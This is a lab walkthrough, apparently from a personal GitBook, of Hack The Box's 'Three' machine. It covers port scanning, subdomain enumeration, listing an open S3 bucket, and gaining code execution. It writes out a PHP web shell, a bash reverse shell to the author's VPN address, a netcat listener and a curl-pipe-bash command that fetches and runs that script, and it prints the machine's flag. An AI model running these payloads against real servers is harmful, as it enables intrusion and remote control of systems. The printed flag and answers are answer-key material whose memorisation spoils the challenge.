# Three (Tier 1)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark>**&#x20;1**
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Cloud / Custom Applications / AWS / Reconnaissance / Web Site Structure Discovery\
  &#x20;             / Bucket Enumeration / Arbitrary File Upload / Anonymous-Guest Access

<figure><img src="../../.gitbook/assets/image (121) (1).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap -p- -Pn --min-rate 2000 10.129.246.158
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (216) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the first question

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**2**_

***

* Then I did an exhaustive scan to know more about the services running on the open ports

{% code lineNumbers="true" %}
```basic
nmap -p22,80 -sVC 10.129.246.158
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (217) (1).png" alt=""><figcaption></figcaption></figure>

***

* As I found the HTTP protocol running on port 80, I went to the browser to check the deployed content. I found what seemed to be a contact page for a band. Navigating through the site, I didn't find anything relevant apart from an email in the _Contact_ section with a curious domain

<figure><img src="../../.gitbook/assets/image (218) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (220) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* With this and a little research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (237) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**thetoppers.htb**_

***

<figure><img src="../../.gitbook/assets/image (238) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**/etc/hosts**_

***

* As this domain could be relevant, I added it to the known hosts by editing the _/etc/hosts_ file. Not getting anything relevant from the web page, I tried using the [_Gobuster_](../../web-exploitation/tools-and-utilities.md#gobuster) tool to fuzz the page and find any possible hidden routes. In this case, I enumerated the found domain to check if there were any related subdomains. With that, I found the subdomain _s3.thetoppers.htb_ existed, and with a little research, I learned it was related to a cloud database on the _Amazon_ servers

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo "10.129.246.158 thetoppers.htb" | sudo tee -a /etc/hosts
gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (222) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (223) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this information and a little research about _Amazon_ services, I answered the next questions

<figure><img src="../../.gitbook/assets/image (239) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**s3.thetoppers.htb**_

***

<figure><img src="../../.gitbook/assets/image (240) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**Amazon S3**_

***

<figure><img src="../../.gitbook/assets/image (241) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**awscli**_

***

<figure><img src="../../.gitbook/assets/image (242) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**aws configure**_

***

<figure><img src="../../.gitbook/assets/image (243) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**aws s3 ls**_

***

* I also added the discovered subdomain to the known hosts to work properly with it

{% code lineNumbers="true" %}
```bash
echo "10.129.246.158 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (226) (1).png" alt=""><figcaption></figcaption></figure>

***

* So knowing this was an [_AWS_](https://aws.amazon.com/es/) service, I tried to connect to it using the [_awscli_](../../database-attacks/tools-and-utilities.md#awscli) utility. First, I configured the tool, in this case, indicating a temporary connection with the _temp_ value. With this done, I tried to list the _S3_ instances and found one named _thetoppers.htb._ Then I listed the elements inside it and found an _index.php_ file, which could be the source code of the web page

{% code overflow="wrap" lineNumbers="true" %}
```bash
aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (224) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (229) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (231) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
&#x20;The _temp_ value is the default credentials for AWS connections if everything is avoided
{% endhint %}

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (244) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**PHP**_

***

* Then, as I had a connection to the S3 instance, I tried to upload a custom file to the bucket in an attempt to gain RCE. To do so, I created a _Shell.php_ file with a proper payload to spawn a shell on the machine and execute a command. Then I uploaded it and checked if it had worked by listing the contents of the bucket again

{% code lineNumbers="true" %}
```bash
sudo nano Shell.php
```
{% endcode %}

{% code title="Shell.php" lineNumbers="true" %}
```php
<?php system($_GET["cmd"]); ?>
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp Shell.php s3://thetoppers.htb
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (232) (1).png" alt=""><figcaption></figcaption></figure>

***

* After that, I accessed the bucket direction from the browser and tried to send a command using the _cmd_ parameter as set on the payload. I saw the server executed it properly and confirmed I have gained RCE

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://thetoppers.htb/Shell.php?cmd=id
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (233) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this, I could explore the filesystem arbitrarily. After some searching, I decided to check the _/var/www_ folder, which is usually the default for the server files, and there I found a _flag.txt_ file. Finally, retrieved the content of the file and got the flag

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://thetoppers.htb/Shell.php?cmd=ls /var/www
http://thetoppers.htb/Shell.php?cmd=cat /var/www/flag.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (235) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (236) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**a980d99281a28d638ac68b9bf9453c2b**_

## <mark style="color:blue;">Alternative Reverse Shell</mark>

Instead of abusing the RCE directly on the browser, I tried to get a Reverse Shell on the machine

* First, I created a simple bash script to send the shell connection to my machine

{% code lineNumbers="true" %}
```bash
sudo nano shell.sh
```
{% endcode %}

{% code title="shell.sh" lineNumbers="true" %}
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.195/1234 0>&1  
#I used my IP on the VPN and an arbitrary port
```
{% endcode %}

***

* Then I established a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener on the arbitrary port chosen above

{% code lineNumbers="true" %}
```sh
nc -nvlp 1234
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (250) (1).png" alt=""><figcaption></figcaption></figure>

***

* After this, in another terminal, I established an HTTP server in the same folder where the _shell.sh_ script was using _Python_, and setting another arbitrary port for the server

{% code lineNumbers="true" %}
```bash
python -m http.server 4444
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (251) (1).png" alt=""><figcaption></figcaption></figure>

***

* I used the RCE to send the shell from the target to my machine using the `curl` command. I observed the page remained loading, and checking the _Python_ server received the petition

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://thetoppers.htb/Shell.php?cmd=curl%2010.10.14.195:4444/shell.sh|bash
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (253) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (255) (1).png" alt=""><figcaption></figcaption></figure>

***

* Finally, I checked the _Netcat_ listener and saw that I had gained the target shell. With that, I could interact with the system more comfortably

<figure><img src="../../.gitbook/assets/image (256) (1).png" alt=""><figcaption></figcaption></figure>
